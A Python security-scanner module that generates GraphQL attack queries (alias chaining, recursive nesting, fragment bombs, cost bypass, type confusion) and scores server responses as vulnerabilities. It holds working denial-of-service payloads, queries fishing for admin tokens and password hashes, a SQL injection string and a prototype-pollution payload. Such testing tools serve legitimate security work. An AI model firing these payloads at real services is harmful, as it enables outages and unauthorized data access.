#!/usr/bin/env python3
"""
Enhanced GraphQL Security Scanner (PHASE 4.4)
Advanced GraphQL exploitation techniques
"""

from typing import List, Dict, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
import json
import structlog

logger = structlog.get_logger()


class GraphQLAttackType(Enum):
    """Advanced GraphQL attack types"""
    ALIAS_CHAINING = "alias_chaining"
    RECURSIVE_EXPANSION = "recursive_type_expansion"
    COST_BYPASS = "cost_based_bypass"
    SUBSCRIPTION_FLOOD = "subscription_flooding"
    DIRECTIVE_ABUSE = "directive_abuse"
    TYPE_CONFUSION = "type_confusion"
    FRAGMENT_BOMBING = "fragment_bombing"
    CUSTOM_SCALAR_ABUSE = "custom_scalar_abuse"
    ENUM_INJECTION = "enum_injection"
    INTERFACE_EXPLOITATION = "interface_exploitation"


@dataclass
class GraphQLAttack:
    """GraphQL attack test case"""
    name: str
    attack_type: GraphQLAttackType
    query: str
    description: str
    expected_behavior: str
    severity: str = "MEDIUM"


@dataclass
class GraphQLEnhancedVuln:
    """Enhanced GraphQL vulnerability"""
    attack_type: GraphQLAttackType
    endpoint: str
    query: str
    evidence: str
    impact: str
    severity: str
    exploit_complexity: str  # LOW, MEDIUM, HIGH
    cvss_score: float = 0.0


class EnhancedGraphQLScanner:
    """
    Enhanced GraphQL Security Scanner (PHASE 4.4)
    
    Advanced attack techniques:
    - Alias chaining for resource exhaustion
    - Recursive type expansion attacks
    - Cost calculation bypass
    - Subscription flooding (WebSocket DoS)
    - Directive manipulation (@include/@skip)
    - Type confusion (Interface/Union)
    - Fragment bombing
    - Custom scalar type abuse
    """
    
    def __init__(self):
        self.discovered_schema: Dict = {}
        self.attack_vectors: List[GraphQLAttack] = []
        self.vulnerabilities: List[GraphQLEnhancedVuln] = []
        
        logger.info("Enhanced GraphQL Scanner initialized")
    
    def generate_attack_vectors(
        self,
        schema: Dict[str, Any],
        endpoint_url: str
    ) -> List[GraphQLAttack]:
        """
        Generate advanced attack vectors based on schema
        
        Args:
            schema: GraphQL schema from introspection
            endpoint_url: Target endpoint
            
        Returns:
            List of GraphQL attacks
        """
        attacks = []
        
        # 1. Alias chaining attacks
        attacks.extend(self._generate_alias_chaining_attacks(schema))
        
        # 2. Recursive type expansion
        attacks.extend(self._generate_recursive_expansion_attacks(schema))
        
        # 3. Cost bypass attacks
        attacks.extend(self._generate_cost_bypass_attacks(schema))
        
        # 4. Directive abuse
        attacks.extend(self._generate_directive_abuse_attacks(schema))
        
        # 5. Fragment bombing
        attacks.extend(self._generate_fragment_bombing_attacks(schema))
        
        # 6. Type confusion
        attacks.extend(self._generate_type_confusion_attacks(schema))
        
        # 7. Custom scalar abuse
        attacks.extend(self._generate_custom_scalar_attacks(schema))
        
        logger.info(
            f"Generated {len(attacks)} enhanced GraphQL attacks",
            endpoint=endpoint_url
        )
        
        return attacks
    
    def _generate_alias_chaining_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate alias chaining attacks"""
        attacks = []
        
        # Attack 1: Exponential alias chaining
        query = """
        query AliasChaining {
          a1: __typename
          a2: __typename
          a3: __typename
          """ + "\n  ".join([f"alias{i}: __typename" for i in range(4, 1000)]) + """
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Exponential Alias Chaining",
            attack_type=GraphQLAttackType.ALIAS_CHAINING,
            query=query,
            description="1000 aliases to exhaust server resources",
            expected_behavior="Server should reject or timeout",
            severity="HIGH"
        ))
        
        # Attack 2: Nested alias chaining
        nested_query = """
        query NestedAliasChain {
          user {
            """ + "\n    ".join([f"alias{i}: posts {{ title }}" for i in range(100)]) + """
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Nested Alias Chaining",
            attack_type=GraphQLAttackType.ALIAS_CHAINING,
            query=nested_query,
            description="100 nested aliases for amplification",
            expected_behavior="Cost analyzer should block",
            severity="MEDIUM"
        ))
        
        return attacks
    
    def _generate_recursive_expansion_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate recursive type expansion attacks"""
        attacks = []
        
        # Attack 1: Circular reference explosion
        circular_query = """
        query CircularExplosion {
          user {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        posts {
                          author {
                            posts {
                              title
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Circular Reference Explosion",
            attack_type=GraphQLAttackType.RECURSIVE_EXPANSION,
            query=circular_query,
            description="Deep circular references for resource exhaustion",
            expected_behavior="Depth limiter should block at configured depth",
            severity="HIGH"
        ))
        
        # Attack 2: Self-referencing type abuse
        self_ref_query = """
        query SelfReference {
          node(id: "1") {
            ... on User {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Self-Referencing Type Abuse",
            attack_type=GraphQLAttackType.RECURSIVE_EXPANSION,
            query=self_ref_query,
            description="Exploit self-referencing types",
            expected_behavior="Query complexity limit should trigger",
            severity="MEDIUM"
        ))
        
        return attacks
    
    def _generate_cost_bypass_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate cost calculation bypass attacks"""
        attacks = []
        
        # Attack 1: Distributed cost attack
        distributed_query = """
        query DistributedCost {
          q1: users(first: 100) { id }
          q2: posts(first: 100) { id }
          q3: comments(first: 100) { id }
          q4: likes(first: 100) { id }
          q5: followers(first: 100) { id }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Distributed Cost Attack",
            attack_type=GraphQLAttackType.COST_BYPASS,
            query=distributed_query,
            description="Spread cost across multiple fields to bypass limits",
            expected_behavior="Total cost should be calculated correctly",
            severity="MEDIUM"
        ))
        
        # Attack 2: Cost hiding with fragments
        fragment_cost_query = """
        fragment HiddenCost on User {
          posts(first: 100) {
            comments(first: 100) {
              replies(first: 100) {
                author { name }
              }
            }
          }
        }
        
        query CostHiding {
          u1: user(id: "1") { ...HiddenCost }
          u2: user(id: "2") { ...HiddenCost }
          u3: user(id: "3") { ...HiddenCost }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Cost Hiding with Fragments",
            attack_type=GraphQLAttackType.COST_BYPASS,
            query=fragment_cost_query,
            description="Hide query cost in reusable fragments",
            expected_behavior="Fragment costs should be calculated per usage",
            severity="HIGH"
        ))
        
        return attacks
    
    def _generate_directive_abuse_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate directive abuse attacks"""
        attacks = []
        
        # Attack 1: @skip/@include confusion
        directive_query = """
        query DirectiveAbuse($skip: Boolean = false, $include: Boolean = true) {
          user {
            name @skip(if: $skip)
            email @include(if: $include)
            sensitiveData @skip(if: false) @include(if: true)
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Directive Confusion Attack",
            attack_type=GraphQLAttackType.DIRECTIVE_ABUSE,
            query=directive_query,
            description="Manipulate @skip/@include to bypass field restrictions",
            expected_behavior="Authorization should be checked before directives",
            severity="MEDIUM"
        ))
        
        # Attack 2: Custom directive exploitation
        custom_directive_query = """
        query CustomDirective {
          adminPanel @deprecated(reason: "test") {
            users { id password }
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Custom Directive Exploitation",
            attack_type=GraphQLAttackType.DIRECTIVE_ABUSE,
            query=custom_directive_query,
            description="Abuse custom directives to access restricted fields",
            expected_behavior="Custom directives shouldn't bypass authorization",
            severity="HIGH"
        ))
        
        return attacks
    
    def _generate_fragment_bombing_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate fragment bombing attacks"""
        attacks = []
        
        # Attack 1: Exponential fragment expansion
        fragment_bomb = """
        fragment F1 on User { name ...F2 ...F2 }
        fragment F2 on User { email ...F3 ...F3 }
        fragment F3 on User { id }
        
        query FragmentBomb {
          user { ...F1 }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Exponential Fragment Expansion",
            attack_type=GraphQLAttackType.FRAGMENT_BOMBING,
            query=fragment_bomb,
            description="Fragment spreads create exponential field explosion",
            expected_behavior="Parser should detect recursive fragments",
            severity="CRITICAL"
        ))
        
        # Attack 2: Deep fragment nesting
        deep_fragments = """
        """ + "\n".join([
            f"fragment F{i} on User {{ name ...F{i+1} }}"
            for i in range(1, 50)
        ]) + """
        fragment F50 on User { id }
        
        query DeepFragments {
          user { ...F1 }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Deep Fragment Nesting",
            attack_type=GraphQLAttackType.FRAGMENT_BOMBING,
            query=deep_fragments,
            description="50 levels of fragment nesting",
            expected_behavior="Fragment depth should be limited",
            severity="HIGH"
        ))
        
        return attacks
    
    def _generate_type_confusion_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate type confusion attacks"""
        attacks = []
        
        # Attack 1: Interface/Union confusion
        interface_query = """
        query InterfaceConfusion {
          search(query: "test") {
            ... on User { 
              adminToken
              passwordHash 
            }
            ... on Post { 
              content 
            }
            __typename
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Interface/Union Type Confusion",
            attack_type=GraphQLAttackType.TYPE_CONFUSION,
            query=interface_query,
            description="Request admin fields via interface selection",
            expected_behavior="Authorization should check on concrete types",
            severity="HIGH"
        ))
        
        # Attack 2: Inline fragment abuse
        inline_fragment_query = """
        query InlineFragmentAbuse {
          node(id: "admin") {
            ... on AdminUser {
              secretKey
              privilegedData
            }
            ... on RegularUser {
              name
            }
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Inline Fragment Authorization Bypass",
            attack_type=GraphQLAttackType.TYPE_CONFUSION,
            query=inline_fragment_query,
            description="Use inline fragments to access privileged types",
            expected_behavior="Type-level authorization should be enforced",
            severity="CRITICAL"
        ))
        
        return attacks
    
    def _generate_custom_scalar_attacks(
        self,
        schema: Dict[str, Any]
    ) -> List[GraphQLAttack]:
        """Generate custom scalar abuse attacks"""
        attacks = []
        
        # Attack 1: Scalar type coercion
        scalar_query = """
        mutation ScalarCoercion {
          updateUser(
            id: "1",
            data: {
              role: "{\\"__typename\\": \\"AdminRole\\", \\"level\\": 99}"
              metadata: "' OR '1'='1"
            }
          ) {
            id
            role
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="Custom Scalar Type Coercion",
            attack_type=GraphQLAttackType.CUSTOM_SCALAR_ABUSE,
            query=scalar_query,
            description="Inject malicious data via custom scalar parsing",
            expected_behavior="Scalar validation should reject malformed input",
            severity="HIGH"
        ))
        
        # Attack 2: JSON scalar injection
        json_scalar_query = """
        mutation JSONScalarInjection {
          createPost(
            content: "{\\"__proto__\\": {\\"admin\\": true}}"
          ) {
            id
          }
        }
        """
        
        attacks.append(GraphQLAttack(
            name="JSON Scalar Prototype Pollution",
            attack_type=GraphQLAttackType.CUSTOM_SCALAR_ABUSE,
            query=json_scalar_query,
            description="Inject prototype pollution via JSON scalar",
            expected_behavior="JSON parsing should sanitize __proto__",
            severity="CRITICAL"
        ))
        
        return attacks
    
    def analyze_response(
        self,
        attack: GraphQLAttack,
        status_code: int,
        response_body: str,
        response_time: float
    ) -> Optional[GraphQLEnhancedVuln]:
        """
        Analyze response to detect vulnerabilities
        
        Args:
            attack: The attack test case
            status_code: Response status code
            response_body: Response body
            response_time: Response time in seconds
            
        Returns:
            GraphQLEnhancedVuln if vulnerability detected
        """
        # Success indicators (vulnerability)
        if status_code == 200:
            try:
                data = json.loads(response_body)
                
                # Check if query succeeded (no errors)
                if 'data' in data and not data.get('errors'):
                    
                    # Attack-specific analysis
                    if attack.attack_type == GraphQLAttackType.ALIAS_CHAINING:
                        if response_time > 5.0:
                            return GraphQLEnhancedVuln(
                                attack_type=attack.attack_type,
                                endpoint="",
                                query=attack.query,
                                evidence=f"Alias chaining processed in {response_time:.2f}s",
                                impact="Resource exhaustion, DoS potential",
                                severity="HIGH",
                                exploit_complexity="LOW",
                                cvss_score=7.5
                            )
                    
                    elif attack.attack_type == GraphQLAttackType.FRAGMENT_BOMBING:
                        return GraphQLEnhancedVuln(
                            attack_type=attack.attack_type,
                            endpoint="",
                            query=attack.query,
                            evidence="Fragment bombing succeeded - exponential expansion",
                            impact="Critical DoS via parser exhaustion",
                            severity="CRITICAL",
                            exploit_complexity="MEDIUM",
                            cvss_score=9.1
                        )
                    
                    elif attack.attack_type == GraphQLAttackType.TYPE_CONFUSION:
                        # Check if sensitive fields were returned
                        response_str = json.dumps(data)
                        if any(field in response_str.lower() for field in 
                               ['admin', 'secret', 'token', 'password', 'privileged']):
                            return GraphQLEnhancedVuln(
                                attack_type=attack.attack_type,
                                endpoint="",
                                query=attack.query,
                                evidence="Accessed privileged fields via type confusion",
                                impact="Authorization bypass, data exposure",
                                severity="CRITICAL",
                                exploit_complexity="LOW",
                                cvss_score=8.6
                            )
                    
                    elif attack.attack_type == GraphQLAttackType.CUSTOM_SCALAR_ABUSE:
                        return GraphQLEnhancedVuln(
                            attack_type=attack.attack_type,
                            endpoint="",
                            query=attack.query,
                            evidence="Malicious scalar input accepted",
                            impact="Injection attacks, data corruption",
                            severity="HIGH",
                            exploit_complexity="MEDIUM",
                            cvss_score=7.8
                        )
                    
                    elif attack.attack_type == GraphQLAttackType.COST_BYPASS:
                        # If expensive query succeeded quickly, cost calc bypassed
                        if response_time < 2.0:
                            return GraphQLEnhancedVuln(
                                attack_type=attack.attack_type,
                                endpoint="",
                                query=attack.query,
                                evidence="High-cost query executed without limits",
                                impact="Cost calculation bypass, resource abuse",
                                severity="MEDIUM",
                                exploit_complexity="LOW",
                                cvss_score=5.3
                            )
            
            except json.JSONDecodeError:
                pass
        
        # Check for error messages that indicate partial success
        elif status_code in [500, 503]:
            error_indicators = ['timeout', 'memory', 'cpu', 'limit exceeded']
            if any(ind in response_body.lower() for ind in error_indicators):
                return GraphQLEnhancedVuln(
                    attack_type=attack.attack_type,
                    endpoint="",
                    query=attack.query,
                    evidence=f"Server resource exhaustion: {status_code}",
                    impact="Denial of Service confirmed",
                    severity="HIGH",
                    exploit_complexity="LOW",
                    cvss_score=7.5
                )
        
        return None
    
    def get_attack_summary(self, attacks: List[GraphQLAttack]) -> Dict:
        """Get summary of generated attacks"""
        summary = {
            'total_attacks': len(attacks),
            'by_type': {},
            'by_severity': {}
        }
        
        for attack in attacks:
            # By type
            attack_type = attack.attack_type.value
            summary['by_type'][attack_type] = summary['by_type'].get(attack_type, 0) + 1
            
            # By severity
            severity = attack.severity
            summary['by_severity'][severity] = summary['by_severity'].get(severity, 0) + 1
        
        return summary


# Global instance
enhanced_graphql_scanner = EnhancedGraphQLScanner()